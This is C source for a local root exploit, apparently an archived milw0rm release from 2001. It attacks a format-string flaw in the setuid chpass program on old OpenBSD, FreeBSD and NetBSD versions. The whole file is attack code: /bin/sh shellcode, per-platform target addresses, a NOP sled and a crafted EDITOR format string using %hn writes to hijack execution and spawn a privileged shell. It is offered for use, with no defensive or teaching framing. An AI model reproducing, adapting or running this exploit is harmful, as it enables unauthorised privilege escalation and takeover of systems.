/*
 * TESO BSD chpass exploit - caddis <caddis@dissension.net>
 *
 * greets: #!teso, #!w00w00, #hert!, #ozsecurity, #plus613
 *
 */
#include <stdio.h>

char bsd_shellcode[] =
"\xeb\x16\x5e\x31\xc0\x8d\x0e\x89"
"\x4e\x08\x89\x46\x0c\x8d\x4e\x08"
"\x50\x51\x56\x50\xb0\x3b\xcd\x80"
"\xe8\xe5\xff\xff\xff/bin/sh";

char ptmp_shellcode[] = 
"\xeb\x26\x5e\x31\xdb\x88\x5e\x07"
"\x89\x76\x12\x89\x5e\x16\x8d\x4e"
"\x12\x8d\x56\x08\x31\xc0\x52\x53"
"\xb0\x0a\xcd\x80\x53\x51\x56\x53"
"\xb0\x3b\xcd\x80\xb0\x01\xcd\x80"
"\xe8\xd5\xff\xff\xff/bin/sh!/etc/ptmp";

struct platform {
    char *name;
    unsigned short count;
    unsigned long dest_addr;
    unsigned long shell_addr;
    char *shellcode;
};

struct platform targets[9] = 
{
    { "OpenBSD 2.7 i386       ", 141, 0xdfbfd25c, 0xdfbfdc32, ptmp_shellcode },
    { "OpenBSD 2.6 i386       ", 149, 0xdfbfd224, 0xdfbfdc1a, ptmp_shellcode },
    { "OpenBSD 2.5 1999/08/06 ", 161, 0xefbfd1a0, 0xefbfdbd6, ptmp_shellcode },
    { "OpenBSD 2.5 1998/05/28 ", 121, 0xefbfd2b0, 0xefbfdc6e, ptmp_shellcode },
    { "FreeBSD 4.0-RELEASE    ", 167,  0x805023c, 0xbfbffc68, bsd_shellcode  },
    { "FreeBSD 3.5-RELEASE    ", 135,  0x804fa58, 0xbfbfdcac, bsd_shellcode  },
    { "FreeBSD 3.4-RELEASE    ", 131,  0x804f988, 0xbfbfdcd0, bsd_shellcode  },
    { "NetBSD 1.4.2           ", 132, 0xbfbfd314, 0xbfbfdc36, bsd_shellcode  },
    { NULL, 0, 0, 0, NULL }
};
 
char jmpcode[129];
char fmt_string[1000];

char *args[] = { "chpass", NULL };
char *envs[] = { jmpcode, fmt_string, NULL };

void usage(char *name)
{
    printf("%s <TARGET>\n"
           "1 - OpenBSD 2.7 i386\n"
           "2 - OpenBSD 2.6 i386\n"
           "3 - OpenBSD 2.5 1999/08/06\n"
           "4 - OpenBSD 2.5 1998/05/28\n"
           "5 - FreeBSD 4.0-RELEASE\n"
           "6 - FreeBSD 3.5-RELEASE\n"
           "7 - FreeBSD 3.4-RELEASE\n"
           "8 - NetBSD 1.4.2\n", name);
    exit(1);
}

int main(int argc, char *argv[])
{
    char *p;
    int x, len = 0;
    struct platform *target;
    unsigned short low, high;
    unsigned long shell_addr[2], dest_addr[2];

    if (argc != 2)
        usage(argv[0]);

    x = atoi(argv[1]) - 1;
    if (x > ((sizeof(targets)-sizeof(struct platform)) / sizeof(struct platform
)) - 1 || x < 0)
        usage(argv[0]);

    target = &targets[x];

    memset(jmpcode, 0x90, sizeof(jmpcode));
    strcpy(jmpcode + sizeof(jmpcode) - strlen(target->shellcode), target->shell
code);
 
    strcat(fmt_string, "EDITOR=");
    for (x = 0; x < target->count; x++) {
        strcat(fmt_string, "%8x");
        len += 8;
    }

    shell_addr[0] = (target->shell_addr & 0xffff0000) >> 16;
    shell_addr[1] =  target->shell_addr & 0xffff;

    if (shell_addr[1] > shell_addr[0]) {
        dest_addr[0] = target->dest_addr+2;
        dest_addr[1] = target->dest_addr;
        low  = shell_addr[0] - len;
        high = shell_addr[1] - low - len;
    } else {
        dest_addr[0] = target->dest_addr;
        dest_addr[1] = target->dest_addr+2;
        low  = shell_addr[1] - len;
        high = shell_addr[0] - low - len;
    }

    /* allign on 4byte boundry relative to ebp */
    *(long *)&jmpcode[1]  = 0x11111111;
    *(long *)&jmpcode[5]  = dest_addr[0];
    *(long *)&jmpcode[9]  = 0x11111111;
    *(long *)&jmpcode[13] = dest_addr[1];

    p = fmt_string + strlen(fmt_string);
    sprintf(p, "%%%dd%%hn%%%dd%%hn", low, high);

    execve("/usr/bin/chpass", args, envs);
    perror("execve");
}


// milw0rm.com [2001-01-12]
